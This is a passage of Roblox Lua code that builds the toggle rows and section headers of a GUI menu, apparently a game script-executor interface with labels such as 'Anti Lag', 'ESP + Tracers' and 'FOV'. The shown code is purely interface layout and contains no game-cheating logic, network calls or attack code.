G.UIStroke_35.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_35.Parent = G.WaveTogglePill_10

G.WaveToggleDot_10 = Instance.new("Frame")
G.WaveToggleDot_10.Name = "WaveToggleDot"
G.WaveToggleDot_10.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_10.BorderSizePixel = 0
G.WaveToggleDot_10.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_10.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_10.ZIndex = 8
G.WaveToggleDot_10.Parent = G.WaveTogglePill_10

G.UICorner_52 = Instance.new("UICorner")
G.UICorner_52.CornerRadius = UDim.new(0, 6)
G.UICorner_52.Parent = G.WaveToggleDot_10

G.TextButton_23 = Instance.new("TextButton")
G.TextButton_23.BackgroundTransparency = 1
G.TextButton_23.BorderSizePixel = 0
G.TextButton_23.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_23.ZIndex = 9
G.TextButton_23.Text = ""
G.TextButton_23.Parent = G.WaveTogglePill_10

G.Frame_57 = Instance.new("Frame")
G.Frame_57.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_57.BackgroundTransparency = 1
G.Frame_57.BorderSizePixel = 0
G.Frame_57.LayoutOrder = 21
G.Frame_57.Size = UDim2.new(1, 0, 0, 40)
G.Frame_57.Parent = G.WavePage_Misc

G.TextLabel_31 = Instance.new("TextLabel")
G.TextLabel_31.BackgroundTransparency = 1
G.TextLabel_31.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_31.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_31.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_31.Text = "Instinct's Anim Pack"
G.TextLabel_31.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_31.TextSize = 11
G.TextLabel_31.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_31.Parent = G.Frame_57

G.WaveTogglePill_11 = Instance.new("Frame")
G.WaveTogglePill_11.Name = "WaveTogglePill"
G.WaveTogglePill_11.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_11.BorderSizePixel = 0
G.WaveTogglePill_11.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_11.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_11.ZIndex = 7
G.WaveTogglePill_11:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_11.Parent = G.Frame_57

G.UICorner_53 = Instance.new("UICorner")
G.UICorner_53.CornerRadius = UDim.new(0, 9)
G.UICorner_53.Parent = G.WaveTogglePill_11

G.UIStroke_36 = Instance.new("UIStroke")
G.UIStroke_36.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_36.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_36.Parent = G.WaveTogglePill_11

G.WaveToggleDot_11 = Instance.new("Frame")
G.WaveToggleDot_11.Name = "WaveToggleDot"
G.WaveToggleDot_11.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_11.BorderSizePixel = 0
G.WaveToggleDot_11.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_11.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_11.ZIndex = 8
G.WaveToggleDot_11.Parent = G.WaveTogglePill_11

G.UICorner_54 = Instance.new("UICorner")
G.UICorner_54.CornerRadius = UDim.new(0, 6)
G.UICorner_54.Parent = G.WaveToggleDot_11

G.TextButton_24 = Instance.new("TextButton")
G.TextButton_24.BackgroundTransparency = 1
G.TextButton_24.BorderSizePixel = 0
G.TextButton_24.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_24.ZIndex = 9
G.TextButton_24.Text = ""
G.TextButton_24.Parent = G.WaveTogglePill_11

G.Frame_58 = Instance.new("Frame")
G.Frame_58.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_58.BackgroundTransparency = 1
G.Frame_58.BorderSizePixel = 0
G.Frame_58.LayoutOrder = 22
G.Frame_58.Size = UDim2.new(1, 0, 0, 40)
G.Frame_58.Parent = G.WavePage_Misc

G.TextLabel_32 = Instance.new("TextLabel")
G.TextLabel_32.BackgroundTransparency = 1
G.TextLabel_32.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_32.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_32.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_32.Text = "R6 Anim Pack"
G.TextLabel_32.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_32.TextSize = 11
G.TextLabel_32.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_32.Parent = G.Frame_58

G.WaveTogglePill_12 = Instance.new("Frame")
G.WaveTogglePill_12.Name = "WaveTogglePill"
G.WaveTogglePill_12.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_12.BorderSizePixel = 0
G.WaveTogglePill_12.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_12.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_12.ZIndex = 7
G.WaveTogglePill_12:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_12.Parent = G.Frame_58

G.UICorner_55 = Instance.new("UICorner")
G.UICorner_55.CornerRadius = UDim.new(0, 9)
G.UICorner_55.Parent = G.WaveTogglePill_12

G.UIStroke_37 = Instance.new("UIStroke")
G.UIStroke_37.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_37.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_37.Parent = G.WaveTogglePill_12

G.WaveToggleDot_12 = Instance.new("Frame")
G.WaveToggleDot_12.Name = "WaveToggleDot"
G.WaveToggleDot_12.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_12.BorderSizePixel = 0
G.WaveToggleDot_12.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_12.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_12.ZIndex = 8
G.WaveToggleDot_12.Parent = G.WaveTogglePill_12

G.UICorner_56 = Instance.new("UICorner")
G.UICorner_56.CornerRadius = UDim.new(0, 6)
G.UICorner_56.Parent = G.WaveToggleDot_12

G.TextButton_25 = Instance.new("TextButton")
G.TextButton_25.BackgroundTransparency = 1
G.TextButton_25.BorderSizePixel = 0
G.TextButton_25.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_25.ZIndex = 9
G.TextButton_25.Text = ""
G.TextButton_25.Parent = G.WaveTogglePill_12

G.WavePage_Visuals = Instance.new("ScrollingFrame")
G.WavePage_Visuals.Name = "WavePage_Visuals"
G.WavePage_Visuals.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Visuals.BackgroundTransparency = 1
G.WavePage_Visuals.BorderSizePixel = 0
G.WavePage_Visuals.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Visuals.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Visuals.Visible = false
G.WavePage_Visuals.ZIndex = 3
G.WavePage_Visuals.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Visuals.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Visuals.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Visuals.ScrollBarImageTransparency = 0.5
G.WavePage_Visuals.ScrollBarThickness = 3
G.WavePage_Visuals.Parent = G.MainOuter

G.UIListLayout_5 = Instance.new("UIListLayout")
G.UIListLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_5.Parent = G.WavePage_Visuals

G.UIPadding_4 = Instance.new("UIPadding")
G.UIPadding_4.PaddingBottom = UDim.new(0, 12)
G.UIPadding_4.PaddingLeft = UDim.new(0, 8)
G.UIPadding_4.PaddingRight = UDim.new(0, 8)
G.UIPadding_4.PaddingTop = UDim.new(0, 6)
G.UIPadding_4.Parent = G.WavePage_Visuals

G.Frame_59 = Instance.new("Frame")
G.Frame_59.BackgroundTransparency = 1
G.Frame_59.BorderSizePixel = 0
G.Frame_59.LayoutOrder = 1
G.Frame_59.Size = UDim2.new(1, 0, 0, 28)
G.Frame_59.Parent = G.WavePage_Visuals

G.TextLabel_33 = Instance.new("TextLabel")
G.TextLabel_33.BackgroundTransparency = 1
G.TextLabel_33.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_33.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_33.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_33.Text = "PERFORMANCE"
G.TextLabel_33.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_33.TextSize = 13
G.TextLabel_33.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_33.Parent = G.Frame_59

G.Frame_60 = Instance.new("Frame")
G.Frame_60.BackgroundTransparency = 1
G.Frame_60.BorderSizePixel = 0
G.Frame_60.LayoutOrder = 52
G.Frame_60.Size = UDim2.new(1, 0, 0, 2)
G.Frame_60.Parent = G.WavePage_Visuals

G.Frame_61 = Instance.new("Frame")
G.Frame_61.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_61.BackgroundTransparency = 1
G.Frame_61.BorderSizePixel = 0
G.Frame_61.LayoutOrder = 2
G.Frame_61.Size = UDim2.new(1, 0, 0, 40)
G.Frame_61.Parent = G.WavePage_Visuals

G.TextLabel_34 = Instance.new("TextLabel")
G.TextLabel_34.BackgroundTransparency = 1
G.TextLabel_34.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_34.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_34.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_34.Text = "Anti Lag"
G.TextLabel_34.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_34.TextSize = 11
G.TextLabel_34.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_34.Parent = G.Frame_61

G.WaveTogglePill_13 = Instance.new("Frame")
G.WaveTogglePill_13.Name = "WaveTogglePill"
G.WaveTogglePill_13.BackgroundColor3 = Color3.fromRGB(24, 90, 195)
G.WaveTogglePill_13.BorderSizePixel = 0
G.WaveTogglePill_13.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_13.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_13.ZIndex = 7
G.WaveTogglePill_13:SetAttribute("WaveStyledOn", true)
G.WaveTogglePill_13:SetAttribute("WaveStyledTheme", "default")
G.WaveTogglePill_13:SetAttribute("WaveToggleOn", true)
G.WaveTogglePill_13.Parent = G.Frame_61

G.UICorner_57 = Instance.new("UICorner")
G.UICorner_57.CornerRadius = UDim.new(0, 9)
G.UICorner_57.Parent = G.WaveTogglePill_13

G.UIStroke_38 = Instance.new("UIStroke")
G.UIStroke_38.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_38.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_38.Parent = G.WaveTogglePill_13

G.WaveToggleDot_13 = Instance.new("Frame")
G.WaveToggleDot_13.Name = "WaveToggleDot"
G.WaveToggleDot_13.BackgroundColor3 = Color3.fromRGB(240, 245, 255)
G.WaveToggleDot_13.BorderSizePixel = 0
G.WaveToggleDot_13.Position = UDim2.new(1, -15, 0.5, -6)
G.WaveToggleDot_13.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_13.ZIndex = 8
G.WaveToggleDot_13.Parent = G.WaveTogglePill_13

G.UICorner_58 = Instance.new("UICorner")
G.UICorner_58.CornerRadius = UDim.new(0, 6)
G.UICorner_58.Parent = G.WaveToggleDot_13

G.TextButton_26 = Instance.new("TextButton")
G.TextButton_26.BackgroundTransparency = 1
G.TextButton_26.BorderSizePixel = 0
G.TextButton_26.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_26.ZIndex = 9
G.TextButton_26.Text = ""
G.TextButton_26.Parent = G.WaveTogglePill_13

G.Frame_62 = Instance.new("Frame")
G.Frame_62.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_62.BackgroundTransparency = 1
G.Frame_62.BorderSizePixel = 0
G.Frame_62.LayoutOrder = 3
G.Frame_62.Size = UDim2.new(1, 0, 0, 40)
G.Frame_62.Parent = G.WavePage_Visuals

G.TextLabel_35 = Instance.new("TextLabel")
G.TextLabel_35.BackgroundTransparency = 1
G.TextLabel_35.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_35.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_35.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_35.Text = "Low Graphics"
G.TextLabel_35.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_35.TextSize = 11
G.TextLabel_35.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_35.Parent = G.Frame_62

G.WaveTogglePill_14 = Instance.new("Frame")
G.WaveTogglePill_14.Name = "WaveTogglePill"
G.WaveTogglePill_14.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_14.BorderSizePixel = 0
G.WaveTogglePill_14.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_14.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_14.ZIndex = 7
G.WaveTogglePill_14:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_14.Parent = G.Frame_62

G.UICorner_59 = Instance.new("UICorner")
G.UICorner_59.CornerRadius = UDim.new(0, 9)
G.UICorner_59.Parent = G.WaveTogglePill_14

G.UIStroke_39 = Instance.new("UIStroke")
G.UIStroke_39.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_39.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_39.Parent = G.WaveTogglePill_14

G.WaveToggleDot_14 = Instance.new("Frame")
G.WaveToggleDot_14.Name = "WaveToggleDot"
G.WaveToggleDot_14.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_14.BorderSizePixel = 0
G.WaveToggleDot_14.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_14.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_14.ZIndex = 8
G.WaveToggleDot_14.Parent = G.WaveTogglePill_14

G.UICorner_60 = Instance.new("UICorner")
G.UICorner_60.CornerRadius = UDim.new(0, 6)
G.UICorner_60.Parent = G.WaveToggleDot_14

G.TextButton_27 = Instance.new("TextButton")
G.TextButton_27.BackgroundTransparency = 1
G.TextButton_27.BorderSizePixel = 0
G.TextButton_27.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_27.ZIndex = 9
G.TextButton_27.Text = ""
G.TextButton_27.Parent = G.WaveTogglePill_14

G.Frame_63 = Instance.new("Frame")
G.Frame_63.BackgroundTransparency = 1
G.Frame_63.BorderSizePixel = 0
G.Frame_63.LayoutOrder = 10004
G.Frame_63.Size = UDim2.new(1, 0, 0, 28)
G.Frame_63.Parent = G.WavePage_Visuals

G.TextLabel_36 = Instance.new("TextLabel")
G.TextLabel_36.BackgroundTransparency = 1
G.TextLabel_36.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_36.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_36.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_36.Text = "ACCESSORIES"
G.TextLabel_36.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_36.TextSize = 13
G.TextLabel_36.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_36.Parent = G.Frame_63

G.Frame_64 = Instance.new("Frame")
G.Frame_64.BackgroundTransparency = 1
G.Frame_64.BorderSizePixel = 0
G.Frame_64.LayoutOrder = 56
G.Frame_64.Size = UDim2.new(1, 0, 0, 2)
G.Frame_64.Parent = G.WavePage_Visuals

G.Frame_65 = Instance.new("Frame")
G.Frame_65.BackgroundTransparency = 1
G.Frame_65.BorderSizePixel = 0
G.Frame_65.LayoutOrder = 10
G.Frame_65.Size = UDim2.new(1, 0, 0, 28)
G.Frame_65.Parent = G.WavePage_Visuals

G.TextLabel_37 = Instance.new("TextLabel")
G.TextLabel_37.BackgroundTransparency = 1
G.TextLabel_37.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_37.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_37.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_37.Text = "ESP"
G.TextLabel_37.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_37.TextSize = 13
G.TextLabel_37.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_37.Parent = G.Frame_65

G.Frame_66 = Instance.new("Frame")
G.Frame_66.BackgroundTransparency = 1
G.Frame_66.BorderSizePixel = 0
G.Frame_66.LayoutOrder = 58
G.Frame_66.Size = UDim2.new(1, 0, 0, 2)
G.Frame_66.Parent = G.WavePage_Visuals

G.Frame_67 = Instance.new("Frame")
G.Frame_67.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_67.BackgroundTransparency = 1
G.Frame_67.BorderSizePixel = 0
G.Frame_67.LayoutOrder = 11
G.Frame_67.Size = UDim2.new(1, 0, 0, 40)
G.Frame_67.Parent = G.WavePage_Visuals

G.TextLabel_38 = Instance.new("TextLabel")
G.TextLabel_38.BackgroundTransparency = 1
G.TextLabel_38.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_38.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_38.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_38.Text = "ESP + Tracers"
G.TextLabel_38.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_38.TextSize = 11
G.TextLabel_38.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_38.Parent = G.Frame_67

G.WaveTogglePill_15 = Instance.new("Frame")
G.WaveTogglePill_15.Name = "WaveTogglePill"
G.WaveTogglePill_15.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_15.BorderSizePixel = 0
G.WaveTogglePill_15.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_15.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_15.ZIndex = 7
G.WaveTogglePill_15:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_15.Parent = G.Frame_67

G.UICorner_61 = Instance.new("UICorner")
G.UICorner_61.CornerRadius = UDim.new(0, 9)
G.UICorner_61.Parent = G.WaveTogglePill_15

G.UIStroke_40 = Instance.new("UIStroke")
G.UIStroke_40.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_40.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_40.Parent = G.WaveTogglePill_15

G.WaveToggleDot_15 = Instance.new("Frame")
G.WaveToggleDot_15.Name = "WaveToggleDot"
G.WaveToggleDot_15.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_15.BorderSizePixel = 0
G.WaveToggleDot_15.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_15.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_15.ZIndex = 8
G.WaveToggleDot_15.Parent = G.WaveTogglePill_15

G.UICorner_62 = Instance.new("UICorner")
G.UICorner_62.CornerRadius = UDim.new(0, 6)
G.UICorner_62.Parent = G.WaveToggleDot_15

G.TextButton_28 = Instance.new("TextButton")
G.TextButton_28.BackgroundTransparency = 1
G.TextButton_28.BorderSizePixel = 0
G.TextButton_28.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_28.ZIndex = 9
G.TextButton_28.Text = ""
G.TextButton_28.Parent = G.WaveTogglePill_15

G.Frame_68 = Instance.new("Frame")
G.Frame_68.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_68.BackgroundTransparency = 1
G.Frame_68.BorderSizePixel = 0
G.Frame_68.LayoutOrder = 6
G.Frame_68.Size = UDim2.new(1, 0, 0, 40)
G.Frame_68.Parent = G.WavePage_Visuals

G.TextLabel_39 = Instance.new("TextLabel")
G.TextLabel_39.BackgroundTransparency = 1
G.TextLabel_39.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_39.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_39.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_39.Text = "Remove Accessories"
G.TextLabel_39.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_39.TextSize = 11
G.TextLabel_39.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_39.Parent = G.Frame_68

G.WaveTogglePill_16 = Instance.new("Frame")
G.WaveTogglePill_16.Name = "WaveTogglePill"
G.WaveTogglePill_16.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_16.BorderSizePixel = 0
G.WaveTogglePill_16.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_16.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_16.ZIndex = 7
G.WaveTogglePill_16:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_16.Parent = G.Frame_68

G.UICorner_63 = Instance.new("UICorner")
G.UICorner_63.CornerRadius = UDim.new(0, 9)
G.UICorner_63.Parent = G.WaveTogglePill_16

G.UIStroke_41 = Instance.new("UIStroke")
G.UIStroke_41.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_41.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_41.Parent = G.WaveTogglePill_16

G.WaveToggleDot_16 = Instance.new("Frame")
G.WaveToggleDot_16.Name = "WaveToggleDot"
G.WaveToggleDot_16.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_16.BorderSizePixel = 0
G.WaveToggleDot_16.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_16.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_16.ZIndex = 8
G.WaveToggleDot_16.Parent = G.WaveTogglePill_16

G.UICorner_64 = Instance.new("UICorner")
G.UICorner_64.CornerRadius = UDim.new(0, 6)
G.UICorner_64.Parent = G.WaveToggleDot_16

G.TextButton_29 = Instance.new("TextButton")
G.TextButton_29.BackgroundTransparency = 1
G.TextButton_29.BorderSizePixel = 0
G.TextButton_29.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_29.ZIndex = 9
G.TextButton_29.Text = ""
G.TextButton_29.Parent = G.WaveTogglePill_16

G.Frame_69 = Instance.new("Frame")
G.Frame_69.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_69.BackgroundTransparency = 1
G.Frame_69.BorderSizePixel = 0
G.Frame_69.LayoutOrder = 4
G.Frame_69.Size = UDim2.new(1, 0, 0, 40)
G.Frame_69.Parent = G.WavePage_Visuals

G.TextLabel_40 = Instance.new("TextLabel")
G.TextLabel_40.BackgroundTransparency = 1
G.TextLabel_40.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_40.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_40.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_40.Text = "Dark Mode"
G.TextLabel_40.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_40.TextSize = 11
G.TextLabel_40.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_40.Parent = G.Frame_69

G.WaveTogglePill_17 = Instance.new("Frame")
G.WaveTogglePill_17.Name = "WaveTogglePill"
G.WaveTogglePill_17.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_17.BorderSizePixel = 0
G.WaveTogglePill_17.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_17.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_17.ZIndex = 7
G.WaveTogglePill_17:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_17.Parent = G.Frame_69

G.UICorner_65 = Instance.new("UICorner")
G.UICorner_65.CornerRadius = UDim.new(0, 9)
G.UICorner_65.Parent = G.WaveTogglePill_17

G.UIStroke_42 = Instance.new("UIStroke")
G.UIStroke_42.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_42.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_42.Parent = G.WaveTogglePill_17

G.WaveToggleDot_17 = Instance.new("Frame")
G.WaveToggleDot_17.Name = "WaveToggleDot"
G.WaveToggleDot_17.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_17.BorderSizePixel = 0
G.WaveToggleDot_17.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_17.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_17.ZIndex = 8
G.WaveToggleDot_17.Parent = G.WaveTogglePill_17

G.UICorner_66 = Instance.new("UICorner")
G.UICorner_66.CornerRadius = UDim.new(0, 6)
G.UICorner_66.Parent = G.WaveToggleDot_17

G.TextButton_30 = Instance.new("TextButton")
G.TextButton_30.BackgroundTransparency = 1
G.TextButton_30.BorderSizePixel = 0
G.TextButton_30.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_30.ZIndex = 9
G.TextButton_30.Text = ""
G.TextButton_30.Parent = G.WaveTogglePill_17

G.Frame_70 = Instance.new("Frame")
G.Frame_70.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_70.BackgroundTransparency = 1
G.Frame_70.BorderSizePixel = 0
G.Frame_70.LayoutOrder = 5
G.Frame_70.Size = UDim2.new(1, 0, 0, 40)
G.Frame_70.Parent = G.WavePage_Visuals

G.TextLabel_41 = Instance.new("TextLabel")
G.TextLabel_41.BackgroundTransparency = 1
G.TextLabel_41.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_41.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_41.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_41.Text = "Wave Mode"
G.TextLabel_41.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_41.TextSize = 11
G.TextLabel_41.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_41.Parent = G.Frame_70

G.WaveTogglePill_18 = Instance.new("Frame")
G.WaveTogglePill_18.Name = "WaveTogglePill"
G.WaveTogglePill_18.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_18.BorderSizePixel = 0
G.WaveTogglePill_18.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_18.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_18.ZIndex = 7
G.WaveTogglePill_18:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_18.Parent = G.Frame_70

G.UICorner_67 = Instance.new("UICorner")
G.UICorner_67.CornerRadius = UDim.new(0, 9)
G.UICorner_67.Parent = G.WaveTogglePill_18

G.UIStroke_43 = Instance.new("UIStroke")
G.UIStroke_43.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_43.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_43.Parent = G.WaveTogglePill_18

G.WaveToggleDot_18 = Instance.new("Frame")
G.WaveToggleDot_18.Name = "WaveToggleDot"
G.WaveToggleDot_18.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_18.BorderSizePixel = 0
G.WaveToggleDot_18.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_18.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_18.ZIndex = 8
G.WaveToggleDot_18.Parent = G.WaveTogglePill_18

G.UICorner_68 = Instance.new("UICorner")
G.UICorner_68.CornerRadius = UDim.new(0, 6)
G.UICorner_68.Parent = G.WaveToggleDot_18

G.TextButton_31 = Instance.new("TextButton")
G.TextButton_31.BackgroundTransparency = 1
G.TextButton_31.BorderSizePixel = 0
G.TextButton_31.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_31.ZIndex = 9
G.TextButton_31.Text = ""
G.TextButton_31.Parent = G.WaveTogglePill_18

G.Frame_71 = Instance.new("Frame")
G.Frame_71.BackgroundTransparency = 1
G.Frame_71.BorderSizePixel = 0
G.Frame_71.LayoutOrder = 63
G.Frame_71.Size = UDim2.new(1, 0, 0, 2)
G.Frame_71.Parent = G.WavePage_Visuals

G.Frame_72 = Instance.new("Frame")
G.Frame_72.BackgroundTransparency = 1
G.Frame_72.BorderSizePixel = 0
G.Frame_72.LayoutOrder = 10002
G.Frame_72.Size = UDim2.new(1, 0, 0, 36)
G.Frame_72.Parent = G.WavePage_Visuals

G.TextLabel_42 = Instance.new("TextLabel")
G.TextLabel_42.BackgroundTransparency = 1
G.TextLabel_42.Position = UDim2.new(0, 14, 0, 11)
G.TextLabel_42.Size = UDim2.new(0, 60, 0, 14)
G.TextLabel_42.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_42.Text = "FOV:"
G.TextLabel_42.TextColor3 = Color3.fromRGB(85, 90, 105)
G.TextLabel_42.TextSize = 10
